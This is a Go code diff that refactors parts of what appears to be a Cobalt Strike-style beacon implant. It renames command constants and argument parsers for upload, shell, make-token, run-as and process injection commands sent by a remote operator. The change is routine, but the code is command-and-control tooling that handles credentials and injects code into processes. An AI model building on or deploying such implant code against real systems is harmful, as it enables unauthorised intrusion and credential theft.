@@ -31,7 +31,7 @@ const (
 	CALLBACK_PROCESS_LIST      = 17
 	CALLBACK_POST_REPLAY_ERROR = 18
 	CALLBACK_PWD               = 19
-	CALLBACK_JOBS              = 20
+	CALLBACK_LIST_JOBS         = 20
 	CALLBACK_HASHDUMP          = 21
 	CALLBACK_PENDING           = 22
 	CALLBACK_ACCEPT            = 23
@@ -70,7 +70,7 @@ const (
 	CMD_TYPE_RUNAS                     = 38
 	CMD_TYPE_PWD                       = 39
 	CMD_TYPE_JOB                       = 40
-	CMD_TYPE_JOBS                      = 41 // beacon runs synchronized now, so there wouldn't be multi jobs in background
+	CMD_TYPE_LIST_JOBS                 = 41
 	CMD_TYPE_JOBKILL                   = 42
 	CMD_TYPE_INJECT_X64                = 43
 	CMD_TYPE_SPAWN_IGNORE_TOKEN_X64    = 44
@@ -98,7 +98,7 @@ const (
 	CMD_TYPE_GET_SYSTEM                = 95
 )
 
-func ParseAnArg(buf *bytes.Buffer) ([]byte, error) {
+func parseAnArg(buf *bytes.Buffer) ([]byte, error) {
 	argLenBytes := make([]byte, 4)
 	_, err := buf.Read(argLenBytes)
 	if err != nil {
@@ -118,7 +118,7 @@ func ParseAnArg(buf *bytes.Buffer) ([]byte, error) {
 
 }
 
-func ParseGetPrivs(b []byte) ([]string, error) {
+func parseGetPrivs(b []byte) ([]string, error) {
 	buf := bytes.NewBuffer(b)
 	privCntByte := make([]byte, 2)
 	_, err := buf.Read(privCntByte)
@@ -128,7 +128,7 @@ func ParseGetPrivs(b []byte) ([]string, error) {
 	privCnt := int(packet.ReadShort(privCntByte))
 	privs := make([]string, privCnt)
 	for i := 0; i < privCnt; i++ {
-		tmp, err := ParseAnArg(buf)
+		tmp, err := parseAnArg(buf)
 		if err != nil {
 			return nil, err
 		}
@@ -137,48 +137,48 @@ func ParseGetPrivs(b []byte) ([]string, error) {
 	return privs, nil
 }
 
-func ParseCommandUpload(b []byte) ([]byte, []byte, error) {
+func parseCommandUpload(b []byte) ([]byte, []byte, error) {
 	buf := bytes.NewBuffer(b)
-	filePath, err := ParseAnArg(buf)
+	filePath, err := parseAnArg(buf)
 	fileContent := buf.Bytes()
 	return filePath, fileContent, err
 
 }
 
 // can also be used on Copy
-func ParseCommandMove(b []byte) ([]byte, []byte, error) {
+func parseCommandMove(b []byte) ([]byte, []byte, error) {
 	buf := bytes.NewBuffer(b)
-	src, err := ParseAnArg(buf)
-	dst, err := ParseAnArg(buf)
+	src, err := parseAnArg(buf)
+	dst, err := parseAnArg(buf)
 	return src, dst, err
 }
 
-func ParseCommandCopy(b []byte) ([]byte, []byte, error) {
-	return ParseCommandMove(b)
+func parseCommandCopy(b []byte) ([]byte, []byte, error) {
+	return parseCommandMove(b)
 }
 
-func ParseCommandShell(b []byte) ([]byte, []byte, error) {
-	return ParseCommandMove(b)
+func parseCommandShell(b []byte) ([]byte, []byte, error) {
+	return parseCommandMove(b)
 }
 
-func ParseMakeToken(b []byte) ([]byte, []byte, []byte, error) {
+func parseMakeToken(b []byte) ([]byte, []byte, []byte, error) {
 	buf := bytes.NewBuffer(b)
-	domain, err := ParseAnArg(buf)
-	username, err := ParseAnArg(buf)
-	password, err := ParseAnArg(buf)
+	domain, err := parseAnArg(buf)
+	username, err := parseAnArg(buf)
+	password, err := parseAnArg(buf)
 	return domain, username, password, err
 }
 
-func ParseRunAs(b []byte) ([]byte, []byte, []byte, []byte, error) {
+func parseRunAs(b []byte) ([]byte, []byte, []byte, []byte, error) {
 	buf := bytes.NewBuffer(b)
-	domain, err := ParseAnArg(buf)
-	username, err := ParseAnArg(buf)
-	password, err := ParseAnArg(buf)
-	cmd, err := ParseAnArg(buf)
+	domain, err := parseAnArg(buf)
+	username, err := parseAnArg(buf)
+	password, err := parseAnArg(buf)
+	cmd, err := parseAnArg(buf)
 	return domain, username, password, cmd, err
 }
 
-func ParseInject(b []byte) (uint32, []byte, error) {
+func parseInject(b []byte) (uint32, []byte, error) {
 	buf := bytes.NewBuffer(b)
 	pidBytes := make([]byte, 4)
 	_, _ = buf.Read(pidBytes)
@@ -195,7 +195,7 @@ func ErrorMessage(err string) {
 	arg2Bytes := packet.WriteInt(0)
 	errMsgBytes := []byte(err)
 	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := packet.MakePacket(31, result)
+	finalPaket := packet.MakePacket(CALLBACK_ERROR, result)
 	packet.PushResult(finalPaket)
 }
 func Sleep() {
